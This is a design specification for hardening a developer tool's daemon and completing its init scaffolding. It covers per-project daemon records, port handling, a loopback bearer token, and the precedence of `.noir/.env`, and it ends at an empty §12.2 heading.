# Daemon Hardening + Init Completeness — Design

> **Status:** specified (not implemented)
> **Target:** v1.14.0 (breaking: the daemon record layout changes, and `.noir/.env` precedence
> inverts — see §15)
> **Capability:** C5 Runtime Infrastructure + C6 Documentation & Knowledge System + C7 Engineering Governance
> **Slice id:** `daemon-hardening`
> **Requires ADR:** ADR-0010 (per-project daemon records + HTTP transport auth) and ADR-0011
> (`.noir/.env` precedence + project-scope doctrine)
>
> **Parts:** A–D daemon hardening · E init completeness · **F `.noir/.env` configuration
> consolidation** · **G `noir run` credential diagnostics**. F and G were added after a live
> reproduction on the maintainer's machine (§1.6–1.8) and a repo-wide audit (14 agents, 78 raw
> findings + 9 completeness-critic additions) whose adversarial pass was, by construction, weak
> (see §2.1 "Audit provenance and its limits").

---

## 1. Problem & motivation

### 1.1 The daemon record is a single global file, and three separate guards exist to compensate

The daemon records itself at `~/.noir/daemon.json` — one file, machine-wide, regardless of
how many projects are active (`packages/daemon/src/lifecycle.ts:32`):

```ts
return process.env.NOIR_DAEMON_JSON ?? join(noirHome(), 'daemon.json');
```

Because the path carries no project identity, the record is keyed by nothing, and **three
independent call sites** have grown a `wrongProject` guard to compensate:

| Site | Code | Behaviour on a foreign record |
|---|---|---|
| `packages/daemon/src/ensure.ts:67-81` | `const wrongProject = rec.projectId !== undefined && rec.projectId !== project.id` | **clears the foreign record** |
| `packages/cli/src/commands/daemon.ts:323-344` (`daemon stop`) | `const wrongProject = …` | leaves it intact |
| `packages/cli/src/commands/daemon.ts:398-408` (`daemon status`) | inline `rec.projectId !== callerProject` check | leaves it intact |

The `ensure.ts` branch is the damaging one. Concretely:

1. Project A's daemon runs (pid 100, record `projectId: A`).
2. Project B runs any write → `ensureDaemonRunning` reads the record, sees `wrongProject`,
   and calls `clearDaemonRecord()` (`ensure.ts:81`) — **deleting a live foreign daemon's record**.
3. B starts its own daemon; the record now says B.
4. A's daemon (pid 100) is still alive holding `.noir/store/A.db` open — but **nothing points
   to it**.
5. A's next CLI call reads B's record → `wrongProject` → clears it → starts **a second daemon
   for A** → two write handles on A's DB.

Step 5 is the single-writer violation the architecture forbids. The codebase already names this
hazard: `ensure.ts:63-66` explains that clearing and starting a second writer is *worse* than
reusing, which is why the pre-1.12 branch reuses. **The wrong-project branch does the thing that
comment warns against.**

Three guards across two files is the symptom. The cause is that the record has no identity.

### 1.2 `daemon.port` is a documented-but-dead knob

`packages/core/src/config.ts:24-30` parses and validates it, and its own `.describe()` says so:

```
.describe('Daemon HTTP port (optional; not yet wired to a consumer)')
```

The plumbing downstream already exists — `http.ts:172` binds `opts.port ?? 0` — but no caller
ever passes a port. `ensure.ts:83` calls `startHttpServer({ project, idleTimeoutSec })` with no
`port`. It is validated, tested (`packages/core/test/config.test.ts:19`), and inert.

### 1.3 The HTTP transport has no credential

`http.ts:41-42` applies `localhostHostValidation()` + `localhostOriginValidation()` (both from
`@modelcontextprotocol/node`) to every request, including `/health` (`http.ts:129`). Those block
the browser/CSRF vector. They do **not** distinguish callers: any local process, including one
running under a different uid on a shared machine, can reach `127.0.0.1:<port>/mcp`. There is no
token on the wire.

### 1.4 First-use spawns a daemon as a side effect

`withDaemon` is **ensure-first, not connect-first** (`packages/cli/src/daemon-client.ts:342-369`):
`resolveDaemon` → `ensureDaemonRunning` (which starts a daemon if none is healthy) → then
`connectClient`. A daemon is started because a command ran, not because a connection was actually
needed.

### 1.5 `noir init` does not describe what it will produce

Verified by running `noir init --dry-run --json` against all five hosts (2026-09-11). Common to
every host (9 files): `.noir/project.id`, `.noir/config.yml`, `.noir/.env.example`, `.noir/NOIR.md`,
`.noir/rules/RULES.md`, `.gitignore`, `.dockerignore`, `.npmignore`, `.prettierignore`.
Host-specific: claude adds `CLAUDE.md`, `.mcp.json`, `.claude/settings.local.json`,
`.noir/hooks/noir-session-start.mjs`, `.noir/router.md` (14 total); agents-md/cursor/opencode add
`AGENTS.md` + their MCP config (11); gemini adds `GEMINI.md` + `.gemini/mcp.json` (11).

**No runtime directory is created by any host.** `.noir/store/`, `.noir/specs/`, `.noir/plans/`,
`.noir/tasks/`, `.noir/audit/`, `.noir/transcripts/` and the rest are created lazily by the feature
that needs them (`packages/workflow/src/artifacts.ts:128-223`,
`packages/daemon/src/integration-seam.ts:258`, `packages/cli/src/commands/run.ts:182`). A user who
finishes `noir init` sees a handful of files and no signal that specs, plans, tasks, audit, or
transcripts exist as concepts.

Separately, `.noir/.env.example` (template `packages/create/templates/env.example.tmpl`)
documents **only** `CLICKUP_API_TOKEN` and the `CLICKUP_TEAM_ID` correction — while
`docs/reference/environment.md` documents model-provider keys, `NOIR_PROFILE`, and the update
kill-switches. The reference is complete; the file the user actually opens at init is not.

### 1.6 `--upgrade` never backfills a seed file — proven by a real project

`.noir/.env.example` is declared with `mode: 'skipIfExists'` (`manifest.ts:181-183`), so a
**fresh** `noir init` creates it. But `--upgrade` is documented to *"emit only regenerate +
managedBlock (skipIfExists left alone)"* (`scaffold.ts:75-77`). A `skipIfExists` entry added to
the manifest after a project was initialized is therefore **never created, by any command**.

Observed on the maintainer's machine: `lib-uii-gateway-partnership-angular` has
`.noir/scaffold-version` = `noir-scaffold=1.0.0`, an existing `.noir/.env`, and **no
`.noir/.env.example`**. `CURRENT_SCAFFOLD_VERSION` is `'1.0.0'` (`scaffold-version.ts:19`) and
`MIGRATIONS` contains only a synthetic `1.0.0 → 1.0.0` no-op (`migrations/index.ts:35-58`), so
no migration can run either. The file is unreachable for that project short of deleting `.noir/`.

This is the general form of the user's complaint: **any seed file added to the manifest after a
project's initialization is permanently absent from that project.**

### 1.7 `.noir/.env` is nominally supported but never produced, and its precedence is inverted

- **Never produced.** `noir init` writes `.env.example`; the user must `cp` it to `.noir/.env`
  by hand. Nothing creates the file, sets its mode, or tells the user it is the recommended home.
- **Inverted precedence.** `loadNoirEnv` fills only keys **unset** in the real environment
  (`env-file.ts:141-152`), i.e. *real env wins*. Every user-facing statement repeats this —
  `docs/reference/environment.md:6`, `docs/reference/config.md:9`,
  `docs/explanation/privacy.md:38`, `docs/getting-started.md:224`,
  `docs/how-to/clickup.md:30`, `docs/how-to/host-profiles.md:70`.
- **Consequence, measured.** The maintainer's `.noir/.env` holds `ANTHROPIC_AUTH_TOKEN`,
  `ANTHROPIC_BASE_URL`, `API_TIMEOUT_MS`, `CLAUDE_CODE_AUTO_COMPACT_WINDOW`, and three
  `ANTHROPIC_DEFAULT_*_MODEL` overrides — and the **same** `ANTHROPIC_*` keys are exported from
  `~/.zshrc`. Because real env wins, the project file is **silently ignored** in every
  shell-launched invocation. The user believed they had configured the project; they had not.
- **The doctrine points elsewhere.** `noir-clickup/SKILL.md:36-53` ranks the placements
  *"1. Primary fix — `~/.claude/settings.json` env block (most reliable); 2. Alternative —
  `~/.zshenv` (NOT `.zshrc`); 3. Last resort — Manual paste"* — **`.noir/.env` is absent
  entirely**. `SKILL.md:392` repeats it. On this machine `~/.claude/settings.json` has no `env`
  block at all (top-level keys: `hooks`, `enabledPlugins`, `extraKnownMarketplaces`,
  `effortLevel`, `modelSettings`, `skipWorkflowUsageWarning`), while `CLICKUP_API_TOKEN` and a
  **dead** `CLICKUP_TEAM_ID` sit in `~/.zshrc` — the location the skill explicitly warns against.

### 1.8 `noir run` fails with unactionable credential guidance

`noir run` deliberately works outside an initialized project (`run.ts:78-81`). When the spawned
host fails to authenticate, `run.ts:135-146` emits:

> `host 'claude' failed (exit 1): Not logged in · Please run /login` … `Note:
> ANTHROPIC_API_KEY is set in your environment — it overrides the logged-in account …`

Two defects:

1. The diagnostic branch keys on `ANTHROPIC_API_KEY` only (`run.ts:140`). The maintainer uses a
   custom gateway via `ANTHROPIC_AUTH_TOKEN` + `ANTHROPIC_BASE_URL`, so the helpful branch
   **never fires** and the user is told to run `/login` when the real cause is an unread
   credential.
2. Once credentials are consolidated into `.noir/.env`, the advice *"unset it"* becomes
   **unactionable**: `applyNoirEnv` re-injects the key on every invocation (`bin.ts:311`), so
   unsetting it in the shell changes nothing. No message names `.noir/.env` as the source.

Reproduced: `lib-uii-gateway-monev-angular` was never `noir init`-ed — its `.noir/` contains only
`transcripts/` — so there was no `.noir/.env` to carry credentials, and the failure surfaced as a
login error.

---

## 2. Research grounding

**Host MCP transport: stdio is the default, and HTTP header support is unreliable.**

- Noir's default host entry is **stdio** — `packages/adapters/src/mcp.ts:34-37` emits
  `{command, args: ['mcp','serve','--stdio']}` when `opts.transport === 'stdio'`. The HTTP entry
  (`{type:'http', url}`) is the *non-default* branch, used when a repo joins a shared workspace
  (ADR-0009) or when a user configures it by hand. **In the default configuration there is no
  network surface at all**, so a transport token has nothing to protect there.
- Claude Code expands `${VAR}` and supports a `headersHelper` command that emits headers at
  connection time, so a secret-free config file is achievable in principle.
- Claude Code has **open, unfixed bugs where `.mcp.json` custom headers are not forwarded on
  tool-call POST requests** — headers may land on the initial SSE connection but not subsequent
  POSTs ([#28293](https://github.com/anthropics/claude-code/issues/28293),
  [#14977](https://github.com/anthropics/claude-code/issues/14977)). The reported workaround is
  `claude mcp add -s user` rather than a project `.mcp.json` — which is exactly what Noir writes.
  Claude Code is Noir's regression-anchor host, so a header-delivered token is unsafe there today.

**Implication.** Auth belongs on the HTTP transport only; the CLI (a client Noir owns) sends the
header; hosts keep stdio.

**Client API (verified, not assumed).** `StreamableHTTPClientTransportOptions.requestInit?:
RequestInit` exists in `@modelcontextprotocol/client@2.0.0-beta.5`
(`dist/index.d.mts:3050`), so the CLI can pass
`{ requestInit: { headers: { Authorization: 'Bearer <token>' } } }`.

**ADR-0009 §11 constrains the activation design.** `withWorkspaceDaemon`
(`packages/cli/src/daemon-client.ts:584-617`) is deliberately **probe-only — no ensure**: a
workspace daemon that is down must fail with guidance rather than silently auto-start. Any
connect-triggered activation must therefore be scoped to the **project** daemon path and must not
change workspace behaviour.

**Existing precedent.** `packages/daemon/src/workspace-record.ts` already implements a
per-identity record at `~/.noir/workspaces/<name>/daemon.json`, keyed by workspace name, with
`read`/`write`/`clear`. Its header comment states the design intent directly: *"deliberately a
DIFFERENT file from the project record so `noir daemon stop` / `ensureDaemonRunning` … can never
adopt or stop a workspace daemon."* §4 applies that same reasoning to projects.

**Project scope beats machine scope for project configuration (§12).**

- **Claude Code's own settings model ranks the project file above the user file.** Its stack is
  managed > `--settings` > `.claude/settings.local.json` (project-local) > `.claude/settings.json`
  (shared project) > `~/.claude/settings.json` (user), and its docs assign the *user* file
  "Personal preferences: theme, editor mode, default model" while the *project* file carries
  "Team permissions, hooks, plugins, and **the environment variables the project needs**"
  ([code.claude.com/docs/en/settings](https://code.claude.com/docs/en/settings)). Noir's current
  doctrine inverts this by ranking `~/.claude/settings.json` "#1 most reliable".
- **1Password documents `env files > shell environment`** as the precedence for `op run`
  ([1password.dev/cli/reference/commands/run](https://www.1password.dev/cli/reference/commands/run))
  — direct prior art for a file-beats-shell rule.
- **Environment variables are the wrong home for secrets on the record.** The systemd
  maintainers' own summary: environment blocks "propagate down the process tree, and are *not*
  generally understood as being secret"
  ([systemd-devel, 2018-11](https://lists.freedesktop.org/archives/systemd-devel/2018-November/041677.html)).
  A shell export is machine-global, appears in `env`/`printenv` and shell history, and has no
  `chmod 600` analogue.
- **Node `--env-file` documents env-wins-over-file**
  ([nodejs.org/api/cli.html](https://nodejs.org/api/cli.html)) — Noir's current behaviour matches
  Node. That semantics exists so an override does not surprise; it is not a statement about where
  configuration *belongs*. The mechanical consequence that matters: a one-shot override and a
  stale global export are **indistinguishable** — both arrive as "the real environment" — which is
  exactly the maintainer's shadowing failure (§1.7).
- **Prior art for provenance.** `atmos describe component <name> --provenance` reports where every
  value originated down to file and line — the pattern §12.4 adopts.

### 2.1 Audit provenance and its limits

Parts F and G are grounded in a 14-agent workflow over this repo (6 parallel sweeps, an adversarial
verify pass, a completeness critic, and a synthesis), plus direct reproduction on the maintainer's
machine.

**The audit's numbers are inflated and must not be read as a severity claim.** It produced 78 raw
findings of which **0 were refuted**, which is a defect in the verification, not evidence that all
78 are real: the survivor rule (`keep >= refute` over two lenses) passed 1–1 ties, so a finding
contested by one verifier and endorsed by the other survived unchanged. Deduplication was also
imperfect — three distinct ids (`clickup-skill-omits-noir-env`,
`clickup-skill-setup-omits-noir-env`, `clickup-skill-token-setup-omits-noir-env`) describe one
defect. Treat the raw count as a superset.

The **completeness critic** was the higher-quality stage and supplied nine additions the sweeps
missed, several load-bearing here: the `run.ts:141` unactionable-advice defect (§13.2), the
`.claude/settings.local.json` surface, the generated-docs trap (§12.5), the `architecture.md`
inventory gap, and the second ClickUp tool description.

Every defect carried into §12.5, §13, and §16 was re-verified by the orchestrator against the
cited file or the live machine before being written down.

---

## 3. Goals & non-goals

### Goals

1. **One record per project**, so no code path can observe or delete another project's record.
   The three `wrongProject` guards become structurally unreachable and are removed.
2. **`daemon.port` is honoured** when configured, with an explicit, honest resolution when the
   port is taken.
3. **The HTTP transport requires a token**; the default stdio path is untouched and no secret is
   written into any host config file.
4. **Daemon activation is connection-driven** on the project path: connect first, start only on a
   refused connection.
5. **`noir init` describes what it produces** — an aligned `.env.example`, a real `.noir/.env`
   created at 0600, and a `.noir/README.md` map — and the managed ignore list stops naming paths
   that are never created.
6. **`noir init --upgrade` backfills what the manifest grew.** Any seed file added after a
   project's initialization is created on the next upgrade, so no project is permanently stranded
   without a file the current version expects (§11).
7. **`.noir/.env` becomes the canonical project configuration home** — it wins over the ambient
   environment for the keys it defines, it is refused when git-tracked, its shadowing is
   diagnosable, and every skill and doc says so first (§12).
8. **`noir run` explains credential failures accurately** — covering the gateway
   (`ANTHROPIC_AUTH_TOKEN`/`ANTHROPIC_BASE_URL`) shape, naming `.noir/.env` when that is the
   source, and noticing when the project was never initialized (§13).

### Non-goals (this slice)

- **No systemd socket units / launchd plists.** Activation is client-side and cross-platform
  (§7); OS service management is not introduced.
- **No change to workspace daemon behaviour.** `withWorkspaceDaemon` stays probe-only, per
  ADR-0009 §11.
- **No token on stdio.** stdio is a child-process pipe with no network surface; a token there
  defends against nothing and puts a secret in a config file.
- **No cross-machine / multi-user / team auth.** Localhost, single-machine. v2.0.
- **No background worker architecture** (the roadmap's other C5 `DONE-WHEN`). Separate slice.
- **No eager creation of runtime directories.** See §9 for why a README is chosen instead.

---

## 4. Part A — Per-project daemon records

### 4.1 Layout

```
BEFORE                                AFTER
~/.noir/daemon.json              →    ~/.noir/daemons/<projectId>.json

~/.noir/workspaces/<name>/daemon.json   (unchanged — existing precedent)
```

The new path is HOME-scoped, so it needs **no `.gitignore` entry** in any project (§10).

### 4.2 New module: `packages/daemon/src/project-record.ts`

Mirrors `workspace-record.ts` exactly, with `projectId` as the identity:

```ts
export interface ProjectDaemonRecord {
  pid: number;
  port: number;
  startedAt: number;
  mode?: 'foreground' | 'detached';
  /** The project this record belongs to — the identity, like `workspace` for a workspace record. */
  projectId: string;
}

export function projectRecordPath(projectId: string): string;
export function readProjectDaemonRecord(projectId: string): ProjectDaemonRecord | null;
export function writeProjectDaemonRecord(projectId: string, rec: ProjectDaemonRecord): void;
export function clearProjectDaemonRecord(projectId: string): void;
/** Enumerate every project record on this machine — for `noir daemon status --all` and doctor. */
export function listProjectDaemonRecords(): Array<{ projectId: string; rec: ProjectDaemonRecord }>;
```

`projectId` becomes **required** (it is the identity); the optional field on today's
`DaemonRecord` becomes mandatory here.

### 4.3 Guards removed (the point of the change)

Because `readProjectDaemonRecord(project.id)` can only ever return *this* project's record, all
three guards collapse:

| Site | Before | After |
|---|---|---|
| `ensure.ts:67-81` | `wrongProject` branch + `clearDaemonRecord()` | deleted — no foreign record is reachable |
| `commands/daemon.ts:323-344` | `wrongProject` + conditional clear | deleted — the record read is already scoped |
| `commands/daemon.ts:398-408` | wrong-project check → exit 4 | deleted |

`daemonStop`'s message improves as a side effect: "No Noir daemon is running" becomes "No Noir
daemon is running **for this project**".

### 4.4 Env override

- **`NOIR_DAEMON_DIR`** (new) overrides the directory holding per-project records. Tests that
  isolate via `NOIR_DAEMON_JSON` today move to this.
- **`NOIR_DAEMON_JSON`** (retained) identifies only the *legacy* single-file path, read
  exclusively by the migration in §4.5.

Both must be in the process-injection denylist in `packages/core/src/env-file.ts:36` — a
`.noir/.env` that redirects the record directory would otherwise be a hijack vector. Verified:
`NOIR_DAEMON_JSON` is **already present**; `NOIR_DAEMON_DIR` is **absent and must be added**
(the pattern is `(?:$|_)`-anchored, so `NOIR_DAEMON_DIR` does not match the existing
`NOIR_DAEMON_JSON` alternative). `NOIR_WORKSPACES_DIR` is present and is the precedent to follow.

### 4.5 One-shot legacy migration

`packages/daemon/src/migrate-legacy-record.ts`:

```ts
export async function retireLegacyDaemonRecord(): Promise<void> {
  if (!existsSync(legacyPath())) return;        // no-op forever after the first success
  const rec = readLegacyRecord();               // the ONLY read of the legacy form, ever
  if (rec && pidAlive(rec.pid)) {
    process.kill(rec.pid, 'SIGTERM');
    const exited = await waitForExit(rec.pid, EXIT_TIMEOUT_MS);
    if (!exited) {
      // Do NOT remove the file and do NOT let the caller start a second daemon:
      // the legacy daemon still holds a write handle on this project's DB.
      throw new Error(
        `a daemon from a previous Noir version (pid ${rec.pid}) did not exit within ` +
          `${EXIT_TIMEOUT_MS}ms and still holds this project's store open — ` +
          `stop it with \`kill ${rec.pid}\` and re-run.`,
      );
    }
  }
  rmSync(legacyPath(), { force: true });
}
```

Called from `ensureDaemonRunning` immediately before starting a daemon, and from `noir doctor`.
Idempotent and self-deleting: after the file is removed no code path reads the legacy form again.

**On timeout the start is refused, not forced.** Proceeding would start a second writer on a DB
the legacy daemon still holds open — precisely the condition this migration exists to prevent.
Refusing keeps the single-writer invariant and hands the user an actionable instruction. The
record file is deliberately left in place so a later attempt retries the same retirement.

**Why this exists.** Without it, a daemon running from the previous version keeps a write handle
on `.noir/store/<projectId>.db` while the new version starts a second one. That window is
**bounded** — the stranded daemon exits after `idleTimeoutSec` (default 900s) — but 15 minutes is
ample time for a `SQLITE_BUSY`. Retiring the old daemon closes the window instead of waiting it
out.

### 4.6 Consumers to update

Verified call sites of the record helpers:

- `packages/daemon/src/ensure.ts` (read, clear)
- `packages/daemon/src/spawn.ts` (read — the detached parent polls for the child's record)
- `packages/daemon/src/http.ts:191,203-204` (write, read, clear)
- `packages/cli/src/daemon-client.ts:151` (`probeDaemon`), `:229-252` (`resolveDaemon`)
- `packages/cli/src/commands/daemon.ts:201,304,344,389,411,441`
- `packages/cli/src/commands/doctor.ts:210`

**Ordering change required in `probeDaemon`.** It currently reads the record first
(`daemon-client.ts:151`) and *then* resolves the caller's project (`:189-197`). With per-project
records, the project id must be resolved **first** — it is the lookup key. This inverts the order
of those two blocks.

`packages/daemon/src/workspace-*.ts` is **not** affected: `workspace-ensure.ts` never imports the
project record (verified).

---

## 5. Part B — `daemon.port` honoured

### 5.1 Wiring

`ensureDaemonRunning({ project, idleTimeoutSec, port })` forwards `port` to `startHttpServer`,
which already binds `opts.port ?? 0` (`http.ts:172`). The CLI passes
`project.config.daemon.port`. `config.ts:29`'s `.describe()` drops the phrase
*"not yet wired to a consumer"*.

Default remains `undefined` → ephemeral, so behaviour without config is unchanged.

### 5.2 Port conflict resolution — a preference, not a demand

Today a bind failure **rejects** (`http.ts:170-177`, `httpServer.once('error', reject)`), and that
rejection propagates out of `startHttpServer`. This is new handling, not rewiring.

When a configured port is already in use:

1. Catch `EADDRINUSE` from the listen promise.
2. Retry once with `port: 0` (ephemeral).
3. Warn on stderr naming the configured port and the actual one.
4. **Record the port actually bound** — never the requested one.

Rule 4 is the invariant that makes everything else safe: the record always tells the truth about
where the daemon is listening. Two projects configured to the same port therefore do not fight —
the second one degrades to ephemeral and says so.

---

## 6. Part C — HTTP-only auth token

### 6.1 Design

- **Generation.** At daemon start, 32 random bytes, base64url. Written to
  `~/.noir/daemons/<projectId>.token`, mode **0600**. Regenerated on every start, so a token never
  outlives its daemon.
- **Enforcement.** On `/mcp` only. The request must carry `Authorization: Bearer <token>`;
  otherwise `401` with a body naming the remediation. `/health` stays token-free but remains
  host/origin-validated (`http.ts:129`) — the probe depends on it, and its body carries only
  `ok`/`pid`/`projectId`/`uptimeSec`, no secret.
- **CLI.** Reads the token file and sends the header via the verified
  `requestInit` option (§2). Noir owns this client, so the Claude Code header bug does not apply.
- **Hosts.** **stdio is untouched** — the default path needs no token and no config change. For
  workspace/HTTP mode, `headersHelper` calling a new `noir daemon token` subcommand (which prints
  the token for the current project) keeps the secret out of `.mcp.json`.
- **Failure is loud.** If a host drops the header, `/mcp` returns 401 and the CLI/host surfaces a
  message naming the workaround (use stdio, or configure `headersHelper`) — never a silent
  connection failure.

### 6.2 What this does and does not defend against

- **Does** stop another local user on a shared machine from reaching the daemon's tool surface
  over loopback.
- **Does not** stop a same-uid process — it can read the 0600 token file. That is inherent; no
  loopback scheme fixes it.
- **Does not** replace host/origin validation, which stays and continues to block the browser
  vector.

### 6.3 Workspace daemon

`startWorkspaceHttpServer` (`workspace-http.ts`) gets the same treatment with its token at
`~/.noir/workspaces/<name>/daemon.token`, mirroring the record layout. Its `/health` keeps
returning `workspace` for `probeWorkspaceDaemon`.

---

## 7. Part D — Connect-triggered activation (project path only)

### 7.1 Change

`withDaemon` becomes connect-first:

```
connect(url from record, port from daemon.port)
  ├─ connected          → proceed
  └─ ECONNREFUSED       → ensureDaemonRunning() → reconnect (bounded backoff) → proceed
```

`ensureDaemonRunning` remains the spawn primitive; only the *decision point* moves. Without a
configured `daemon.port` there is no stable address to probe first, so the flow falls back to
today's ensure-first path. **D therefore depends on B.**

### 7.2 Hard constraint

**This must not touch the workspace path.** `withWorkspaceDaemon` stays probe-only, per ADR-0009
§11: a workspace daemon that is down fails with guidance rather than silently starting. Any
implementation that routes workspace calls through the new activation path violates that ADR.

### 7.3 Honest scoping

The benefit is that a daemon starts because a connection was genuinely attempted, rather than as a
side effect of a command that may not need one. It does **not** remove first-command latency, and
it is not a prerequisite for Parts A–C. If it proves to add complexity without a measurable win
during implementation, it is the natural candidate to defer — recorded in §16 acceptance criteria
as the separable item.

---

## 8. Part E1 — `.env.example` aligned with the reference

Extend `packages/create/templates/env.example.tmpl`, grouped and commented, to cover what
`docs/reference/environment.md` already documents:

- **Embedder keys — a closed, fixed set**, listed in `environment.md:51-61` and therefore
  nameable literally: `OPENAI_API_KEY` (`context.embedder.kind: remote`, `provider: openai`),
  `VOYAGE_API_KEY` (`provider: voyage`), `COHERE_API_KEY` (`provider: cohere`),
  `OLLAMA_BASE_URL` (`kind: ollama`).
- **The model provider key is NOT a fixed variable.** `environment.md:42-43` documents it as
  `model.tiers.<tier>.apiKeyEnv: <NAME>` — the user chooses the variable *name* and Noir reads
  whatever is named. `ANTHROPIC_API_KEY` is the *conventional example*, not a variable Noir looks
  up unconditionally. The template must present it that way (a commented `apiKeyEnv:` example),
  not as a hard-coded key that silently does nothing if set.
- The provider-explicit caveat: with no provider configured the layer degrades to templates —
  never a silent paid call.
- `NOIR_PROFILE` for run-profile selection.
- `NOIR_DISABLE_UPDATE_CHECK` / `NOIR_DISABLE_UPDATES`.
- A closing pointer to `docs/reference/environment.md` as the single complete reference.

Getting bullet 2 right matters: a user who exports `ANTHROPIC_API_KEY` without setting
`apiKeyEnv` gets **no** model call, and would reasonably read that as a bug.

### 8.1 `noir init` creates `.noir/.env` itself

Today init writes only `.env.example`, and the user is expected to copy it by hand. The
maintainer's ask is explicit: *"user tidak perlu melakukan generate file manual, seperti generate
file manual env"*. Init therefore creates **both** files:

| File | Mode | Purpose |
|---|---|---|
| `.noir/.env.example` | `skipIfExists` | committable documentation of the format; stays visible in git |
| `.noir/.env` | `skipIfExists` | the real, working file — created empty of values, mode **0600** |

The new entry is a `skipIfExists` manifest entry seeded from the same template body, with all
values commented out. Constraints:

- **No real or placeholder value is ever written as active.** Every line is a comment; the file
  parses to an empty overlay, so creating it changes no behaviour.
- **Mode 0600 at creation.** The file holds tokens the moment the user edits it; creating it
  world-readable and relying on a later `noir doctor` warning is the wrong default. Because
  `skipIfExists` never touches an existing file, the mode is set on creation only — a user who
  chmods it back is warned by the existing doctor advisory (`doctor.ts:328-348`).
- **Gitignored already.** The managed block carries `/.noir/.env` and `/.noir/.env.*`, with the
  `!/.noir/.env.example` negation keeping the example committable (`ignore-manager.ts:22-26`).
  Exit criterion E3 verifies these globs actually behave — they are currently untested.

Together with §12.2's tracked-file refusal, this is coherent: init creates the file **untracked**
and gitignored, which is exactly the condition under which §12.2 will trust it.

### 8.2 The generated files must be accurate, not just present

Creating the files is not sufficient — the earlier failure was a file that did not exist, but the
adjacent risk is a file that exists and misleads. The doctrine header added to both templates must
match §12.1 verbatim, and the init time is the right moment to state it, because the user reads
these files **at the moment of configuration**, not in `docs/`.

Constraints: every entry stays **commented out** with fake placeholders (the existing file's
convention), and the entry stays `skipIfExists` (`manifest.ts:182`) so a user's edited file is
never overwritten.

---

## 9. Part E2 — `.noir/README.md` map

Generated by the manifest as part of init, listing:

1. **What exists now** — the files init just wrote, one line each.
2. **What appears later** — each runtime directory, the feature that creates it, and the command
   that triggers it.
3. **Where to go next** — config, environment variables, and the SDD workflow.

Chosen over eager directory creation because every runtime directory is gitignored (`store/`,
`handoff/`, `transcripts/`), so `.gitkeep` files would themselves be ignored — creating the
directories buys nothing. A README is discoverable, committable, and explains the *why*.

### 9.1 This changes `noir init` output — deliberately

Two files are added (`.noir/README.md`, `.noir/.env`) and one is rewritten (`.env.example`). The
parity gates (`packages/adapters/test/claude.test.ts`, `packages/create/test/scaffold.test.ts`)
must be updated deliberately, exactly as the `scaffold-version` stamp and the NOIR.md
managed-block markers were in earlier slices.

The contract for the change: **additive only**. Every entry that exists today keeps byte-identical
content, so `claude` remains the regression anchor for the *existing* surface. `env.example.tmpl`
is the sole exception and is called out in the plan as an intentional content change with its own
assertion.

---

## 10. Part E3 — Managed ignore list cleanup

`packages/core/src/ignore-manager.ts:16-32` currently writes:

```
/.noir/store/       keep — real
/.noir/handoff/     keep — real
/.noir/*.sock       REMOVE — no socket is ever created
/.noir/daemon.pid   REMOVE — the daemon records under ~/.noir/, never project-local
/.noir/state/       REMOVE — never created
/.noir/.env         keep
/.noir/.env.*       keep
!/.noir/.env.example keep
/.noir/transcripts/ keep — real
```

The three removed entries are already flagged as *vestigial* in
`docs/roadmap/capability-05-runtime-infrastructure.md`. They are also load-bearing in a subtle
way: `/.noir/daemon.pid` and `/.noir/*.sock` describe a project-local daemon layout that never
existed and **does not exist after this slice either** — records are HOME-scoped (§4.1), so no
replacement entry is needed. Removal is the correct outcome, not relocation.

---

## 11. Part E4 — `noir init --upgrade` backfills missing seeds

`--upgrade` today emits only `regenerate` + `managedBlock` and deliberately leaves
`skipIfExists` alone (`scaffold.ts:75-77`). That makes any seed file added to the manifest *after*
a project's initialization permanently unreachable for that project (§1.6).

### 11.1 The fix: upgrade emits every mode

`upgrade` runs the full manifest; `skipIfExists` keeps its exact semantics — **create only if
absent, never modify an existing file**. This is safe by construction: the writer cannot clobber
user content, which is precisely why it is the right mode to run unconditionally.

No new mode is introduced. The three modes keep their meanings:

| Mode | Fresh `init` | `--upgrade` today | `--upgrade` after |
|---|---|---|---|
| `skipIfExists` | create if absent | **skipped entirely** | create if absent |
| `regenerate` | write | re-emit | re-emit |
| `managedBlock` | write block | re-emit block | re-emit block |

### 11.2 Version bump and the first real migration

`CURRENT_SCAFFOLD_VERSION` moves `1.0.0 → 1.1.0`. The file's own contract requires it: *"Bumped
atomically whenever a manifest entry, template, or migration changes shape"*
(`scaffold-version.ts:17-19`) — and this slice changes manifest entries and templates.

`noir doctor` **already** reports scaffold drift (`checkScaffoldVersion`, `doctor.ts:461-485`,
surfaced as `scaffold: { onDisk, current, drift }`). No new doctor row is needed: the bump alone
makes every existing project show drift, which is what tells the user to run `--upgrade`. This is
the mechanism that closes §1.6 for projects already on disk.

`MIGRATIONS` gains its first real entry, `1.0.0 → 1.1.0`, whose job is the **transformation**
work that `skipIfExists` cannot do. Its scope is deliberately narrow — it is idempotent and
additive:

1. Ensure `.noir/config.yml` carries the pointer comment telling the reader the file is
   committable and that secrets belong in `.noir/.env`. Append only if the marker is absent
   (a `config.yml` is `skipIfExists`, so it will never be rewritten by the manifest).
2. Record the files it backfilled in `MigrationResult.changed` so the upgrade output is honest.

Everything else in this slice is *creation*, which §11.1 handles, and *managed blocks*, which
`managedBlock` re-emission handles. The migration must not duplicate either.

### 11.3 Interaction with `--force` and dry-run

`--dry-run` must report the backfill as **planned writes** without touching disk, and must not
report a `skipIfExists` file that already exists. `--force` keeps bypassing the
already-initialized no-op guard; it does not change `skipIfExists` semantics.

---

## 12. Part F — `.noir/.env` as the canonical configuration home

### 12.1 Precedence inversion

**New rule:** `.noir/.env` **wins** for every key it defines; the real environment is the
**fallback** for keys the file does not define.

This is a deliberate, documented departure from Node `--env-file` fill-only-unset semantics. It is
what the research supports for *project-scoped* configuration (§2), and it is the only rule under
which a project file can be trusted to describe its own project.

Implementation: invert the fill condition in `loadNoirEnv` (`env-file.ts:141-152`) so a file key
overwrites the ambient value rather than deferring to it. The full chain:

```
1. one-shot          VAR=value noir ...            (this invocation only)
2. run profile env   run.profiles.<n>.env          (existing documented exception; merges OVER)
3. .noir/.env        ← the recommended home for project-scoped configuration
4. real environment  CI / container / launchd / shell rc
5. built-in default
```

Levels 4 and 5 are unchanged in meaning; only their rank relative to `.noir/.env` moves.

**What must not change.** `applyNoirEnv` continues to mutate **only Noir's own `process.env`**
(and therefore the children Noir spawns). It never writes to a shell profile, never exports to the
parent, and never persists anything. A user's manual `claude` invocation in a terminal is
untouched — it sees the shell environment exactly as before. This is what makes the change
compatible with the "many Claude profiles with different API keys" workflow.

### 12.2 Refusing a git-tracked `.noir/.env`

